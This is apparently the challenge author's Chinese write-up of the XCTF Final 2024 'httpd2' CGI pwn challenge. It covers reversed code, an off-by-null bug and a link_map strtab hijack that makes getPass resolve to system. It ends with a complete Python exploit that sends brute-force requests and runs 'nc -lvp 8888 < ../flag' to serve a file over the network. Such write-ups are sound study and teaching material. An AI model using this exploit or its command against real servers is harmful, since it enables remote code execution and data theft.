# xctf final 2024 httpd2 writeup

> **来源**: https://forum.butian.net/share/3123  
> **文章ID**: 3123

---

题目逻辑
----

题目本身是一个apache服务器，实现了一个CGI `main.cgi`。`main.cgi`实现了简单的登陆逻辑。

程序首先会初始化参数。`sub_1429`中，首先获取`Content-Length`，再申请`Content-Length+8`的空间，之后每次循环读取0x400个字节直到读取完毕。

读完后的逻辑是对content进行urldecode的操作，在遇到`&`时把下一个参数的指针保存到全局数组`qword_40C0`中，该数组在之后利用会用到。

```c
__int64 sub_1429()
{
  if ( dword_140D0 != 1 )
    goto LABEL_36;
  nptr = getenv("CONTENT_LENGTH");
  if ( nptr )
  {
    v7 = strtol(nptr, 0LL, 10);
    size = v7 + 8;
    qword_140D8 = v7;
    if ( v7 > 0x8000000 )
      return 0xFFFFFFFFLL;
  }
  else
  {
    v7 = 4096LL;
    size = 4104LL;
    qword_140D8 = 4096LL;
  }
  ptr = (char *)malloc(size);
  if ( !ptr )
  {
LABEL_36:
    if ( ptr )
      free(ptr);
    return 0xFFFFFFFFLL;
  }
  qword_140E0 = (__int64)malloc(size);
  if ( !qword_140E0 )
    return 0xFFFFFFFFLL;
  v13 = qword_140D8;
  v8 = 0LL;
  while ( 1 )
  {
    v4 = read(0, &ptr[v8], 0x400uLL);
    if ( !v4 )
      break;
    if ( v4 < 0 )
      return 0xFFFFFFFFLL;
    v8 += v4;
    if ( v8 > v13 )
      return 0xFFFFFFFFLL;
  }
  ptr[v13] = 0;
  v9 = ptr;
  v14 = qword_140E0;
  v1 = *ptr;
  v10 = 0LL;
  v11 = 0LL;
  qword_40C0[0] = qword_140E0;
  if ( !*ptr || !v7 )
  {
    qword_140C0 = 0LL;
    goto LABEL_18;
  }
  while ( 1 )
  {
    if ( v1 == 43 )
    {
      *(_BYTE *)(v14 + v10) = 32;
      goto LABEL_32;
    }
    if ( v1 > 43 )
      goto LABEL_31;
    if ( v1 == 37 )
    {
      v2 = sub_13D6(v9[1]);
      v3 = sub_13D6(v9[2]);
      if ( v2 == -1 || v3 == -1 )
      {
        *(_BYTE *)(v10 + v14) = v1;
      }
      else
      {
        *(_BYTE *)(v14 + v10) = v3 | (16 * v2);
        v9 += 2;
      }
      goto LABEL_32;
    }
    if ( v1 != '&' )
    {
LABEL_31:
      *(_BYTE *)(v10 + v14) = v1;
      goto LABEL_32;
    }
    *(_BYTE *)(v14 + v10) = 0;
    qword_140C0 = ++v11;
    if ( v11 != 0x2000 )
    {
      qword_40C0[v11] = v10 + 1 + v14;
      if ( !v9[1] )
        break;
    }
LABEL_32:
    if ( !v1 )
      break;
    ++v10;
    if ( ++v9 >= &ptr[v13] )
      break;
    v1 = *v9;
  }
  *(_BYTE *)(v14 + v10 + 1) = 0;
LABEL_18:
  free(ptr);
  return 0LL;
}
```

main函数中获取`userame`和`passwd`参数，传入`libctfc`的`checkLogin`验证。

`checkLogin`根据`passwd`生成`cookie`，再根据`username`获取对应`passwd`与输入的参数比较。密码正确就会设置`Set-Cookie`字段。

漏洞
--

题目本身有2个漏洞。

一是全局数组qword\_40C0在存指针时没有有效判断边界，index大于0x2000之后没有退出循环，导致可以越界写指针。

```c
if ( v11 != 0x2000 )
{
  qword_40C0[v11] = v10 + 1 + v14;
  if ( !v9[1] )
    break;
}
```

二是在genCookie中，未检查输入的密码的长度，密码是可控的，导致越界写0。

```c
v4 = strlen(a1);
sub_135A(dest, 0x400uLL, a1, v4 + 1);
dest[v4] = 0;
sprintf(src, ":%lx", buf);
strncat(dest, src, 0x400uLL);
return dest;
```

只有第2个可以利用。

调试
--

apache在接收到请求时会fork子进程去运行对应的CGI，所以实际要调试的是子进程。

首先attach用户为www的进程（gdb附加上去后会停在accept，否则就是附加错进程）。

![image-20240630194439838.png](images/attach-11f0aa2790c5840343fda0e5cbe6bc2c759eadd5.png)

在fork下断点，发包，程序断在fork，输入

```bash
set follow-fork-mode child
catch exec
c
```

之后gdb进入子进程`main.cgi`的`__start`处就可以调试了。

利用
--

修改`link_map`的`l_info[DT_STRTAB]`，劫持`_dl_runtime_resolve`流程，执行任意函数。

### \_dl\_runtime\_resolve

根据`glibc/elf/dl-runtime.c`源码，`ld`在解析函数地址时首先从`link_map`中获取符号表（symtab）和字符串表（strtab），根据偏移从符号表获取对应表项，表项中的`st_name`是这个符号名称在字符串表中的偏移，之后将`strtab + sym->st_name`传入`_dl_lookup_symbol_x`查找函数地址。如果我们能够最终**修改传给`_dl_lookup_symbol_x`的参数就能解析任意函数**。

```c
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
       ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
       struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
...
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

...
  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```

### 修改strtab

分析源码可知，我们可以修改`symtab`和`strtab`，`strtab`存放的是字符串，伪造起来更方便，所以选择伪造`strtab`。

`l_info[DT_STRTAB]`结构体如下

```c
typedef struct
{
  Elf64_Sxword  d_tag;          /* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;        /* Integer value */
      Elf64_Addr d_ptr;         /* Address value */
    } d_un;
} Elf64_Dyn;
```

通过调试也可以看到，`l_info[DT_STRTAB]`在`link_map+0x68`处，指向的内存先是一个整数5，之后是一个地址`0x7f7560b5d408`，该地址指向一个字符串，这个字符串就是`strtab`。

![image-20240630201924648.png](images/attach-7066eacb04b287849e1c898174fe5e052191ed0b.png)

越界写0的漏洞只能修改`0x7fb7407f3ea0`这个地址，为了能劫持`0x7fb7407f0408`，**我们需要把0x7fb7407f3ea0指向一个位置，这个位置存放着指向可控内容的指针**。

正好程序在初始化时会把content中的每个键值对保存全局数组`qword_40C0`中，例如content是

```html
a=b&a=c&a=d&a=e&a=f
```

内存布局是

![image-20240628113748771.png](images/attach-2905b89273653b491a47eb70b9a16c63b0124b23.png)

所以我们需要让`0x7fb7407f0408`指向全局数组`qword_40C0`。

### 地址计算

首先需要计算溢出的缓冲区到`link_map+0x68`的偏移。

为了能够解析任意函数，我们需要找一个**在利用漏洞之后还未解析的且第一个参数可控的函数（system第一个参数）**，越界写0之后未解析的函数只有一个`getPass`在`libctf.so`中，我们可以查看`libctf.so`的内存布局

![image-20240630195335587.png](images/attach-5c7e760097cf6955d1cb51a352f22b28d84352ae.png)

`0x7f148fd5e1e0`就是`libctf.so`的`link_map`的地址，计算全局变量`dest`到`0x7f148fd5e1e0+0x68`偏移得到`0x125f48`。因为我们只能改一个0，所以只能把第三个字节改成0，偏移加上2得到`0x125f4a`。

低12位的地址不会随ASLR变化，`l->l_info[DT_STRTAB]`的低12位是`0xea0`，为了保证命中，需要在`qword_40C0`中布局，使`0x*ea0+8`（+8是因为`l->l_info[DT_STRTAB]`指向的内存第一个是一个整数，第二个才是strtab指针）的位置放置伪造的`strtab`。

伪造的`strtab`中，可以复制一份`libctf.so`原来的`strtab`，把其中的`getPass`改成`system`，同时保证其他字符串偏移与原来相同。

剩下的就交给爆破。

exp
---

exp中构造指针数组时我是`&0xffff`保证低16位相同，实际只要`&0x0fff`保证低12位就行。

题目给了两个端口，可以执行命令后用nc把flag读到另一个端口。

```python
import requests

ip = "127.0.0.1"
port = 8888

overflow_start_addr =  0x7fbfd7002000 +0x14300
link_map_0x68 = 0x7fbfd713c248
ptr_arr_addr =  0x7fbfd7002000  + 0x40C0
real_strtab_addr = 0x7fbfd701aea0

# set least 3 byte to 0
strtab_pad = link_map_0x68 - overflow_start_addr + 2

fake_strtab = "%00__gmon_start__%00_ITM_deregisterTMCloneTable%00_ITM_registerTMCloneTable%00__cxa_finalize%00checkLogin%00genCookie%00getPass%00strcmp%00printf%00libctfc.so%00libc.so.6%00GLIBC_2.2.5%00%00"
fake_strtab = fake_strtab.replace("%00getPass%00", "%00system%00".ljust(len("%00getPass%00"),'a'))

def cons_ptr_arr():
    least_2_bytes = real_strtab_addr&0xffff
    re = ""
    offset = ptr_arr_addr
    for i in range(0x2000):
        if (offset-8)&0xffff == least_2_bytes:
            re += fake_strtab
            break
        else:
            re +="a=b"
        offset += 8
        re += '&'
    return re

def send_req(data):
    url = f"http://{ip}:{port}/cgi-bin/main.cgi"
    data_len = len(data)

    headers = {
        "Host": f"{ip}",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Content-Length": f"{data_len}",
    }

    response = requests.post(url, data = data)
    print(response.text)

data = cons_ptr_arr()
cmd = "nc -lvp 8888 < ../flag"
data += f"&username={cmd}&passwd={'a'*strtab_pad}&a=b"
i = 0
while True:
    i+=1
    print(i)
    send_req(data)

```

总结
--

出题时没有把代码写的很复杂，目的是让选手专注在漏洞利用上。不能用的洞在比赛前一天才发现，不过不影响题目也就没有改。

题目漏洞不难发现，利用时一个要是想到打`link_map`，一个是把`l_info[DT_STRTAB]`指向全局数组。最后0解有点意外，可能时间太少大佬又去打google ctf了吧。
